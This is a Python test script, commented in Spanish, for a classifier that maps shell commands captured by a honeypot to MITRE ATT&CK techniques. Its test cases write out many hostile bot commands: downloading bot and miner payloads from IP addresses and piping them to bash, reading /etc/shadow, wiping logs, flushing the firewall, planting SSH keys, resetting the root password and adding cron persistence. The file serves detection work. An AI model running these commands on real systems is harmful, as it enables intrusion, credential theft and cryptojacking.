#!/usr/bin/env python3
"""
Pruebas del clasificador MITRE ATT&CK (mitre_mapping.py).
Uso:  python3 scripts/test_mitre_mapping.py
Incluye comandos reales tipicos de bots y casos de posibles falsos positivos.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from mitre_mapping import clasificar_comando  # noqa: E402

CASOS = {
    # Casos vistos en los datos reales del honeypot (octubre de 2026)
    "pwd": {"T1083"},
    "hostname": {"T1082"},
    "mount | head -5": {"T1082"},
    "env | head -10": {"T1082"},
    "ssh -V": {"T1082"},
    "/ip cloud print": {"T1082"},
    "history | tail -5": {"T1552.003"},
    "LC_ALL=C rm -f /bin/415fwoo11121kb2rf2xih0cl59": {"T1070.004"},
    'printf "#!/bin/bash\\necho \\"xxxxxx\\"\\n" > filter && chmod +x filter && ./filter && rm -rf filter': {"T1222.002", "T1497.001"},
    "rm -rf /tmp/secure.sh; pkill -9 secure.sh; echo > /etc/hosts.deny": {"T1070.004", "T1562.004"},
    "head -c 3800636 > /tmp/X0PuJAzJdG": {"T1105"},
    "chmod +x setup.sh; sh setup.sh; ./redtail.x86_64": {"T1222.002", "T1496.001"},
    "ls -la ~/.local/share/TelegramDesktop/tdata /var/spool/sms/* /var/log/smsd.log": {"T1083", "T1005"},
    "locate D877F783D5D3EF8Cs": {"T1005"},
    "cat /dev/null > /var/log/wtmp": {"T1070.002"},
    # Falsos positivos que no deben clasificarse
    "hostnamectl": {"T1082"},
    "cd ~ && rm -rf .ssh && mkdir .ssh": set(),
    # Comandos tipicos de bots
    "uname -a": {"T1082"},
    "cat /etc/passwd": {"T1087.001"},
    "whoami": {"T1033"},
    "id": {"T1033"},
    "w": {"T1033"},
    "wget http://45.148.10.22/bins/bot.x86 -O /tmp/bot": {"T1105"},
    "cat /proc/cpuinfo": {"T1082"},
    "curl http://103.237.144.11/scan.sh | bash": {"T1105"},
    "free -m": {"T1082"},
    "ls -la /tmp": {"T1083"},
    "chmod +x /tmp/bot": {"T1222.002"},
    "cat /etc/shadow": {"T1003.008"},
    "history -c": {"T1070.003"},
    "rm -rf /var/log/*": {"T1070.002"},
    "nproc": {"T1082"},
    "curl http://89.248.163.200/miner.sh -o /tmp/miner.sh": {"T1105", "T1496.001"},
    "ifconfig": {"T1016"},
    "bash /tmp/miner.sh": {"T1496.001"},
    "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys": {"T1098.004"},
    "cd ~; chattr -ia .ssh; lockr -ia .ssh": {"T1222.002"},
    'echo "root:Xy12"|chpasswd|bash': {"T1098"},
    "(crontab -l; echo '* * * * * /tmp/x') | crontab -": {"T1053.003"},
    "echo YmFzaA== | base64 -d | sh": {"T1140"},
    "iptables -F": {"T1562.004"},
    "ps aux | grep miner": {"T1057", "T1496.001"},
    "lscpu | grep Model": {"T1082"},
    "pidof sshd": {"T1057"},
    # Sin tecnica propia (solo T1059.004, que se asigna aparte)
    "cd /tmp": set(),
    "crontab -l": set(),
    "/tmp/bot": set(),
    # Posibles falsos positivos
    "echo hidden": set(),
    "cat /tmp/window.txt": set(),
    "showip": set(),
}


def main():
    fallos = 0
    for cmd, esperado in CASOS.items():
        obtenido = {t[0] for t in clasificar_comando(cmd)}
        if obtenido != esperado:
            fallos += 1
            print(f"FALLO  {cmd!r}\n       esperado {sorted(esperado)}  obtenido {sorted(obtenido)}")
    print(f"{len(CASOS) - fallos}/{len(CASOS)} casos correctos")
    sys.exit(1 if fallos else 0)


if __name__ == "__main__":
    main()
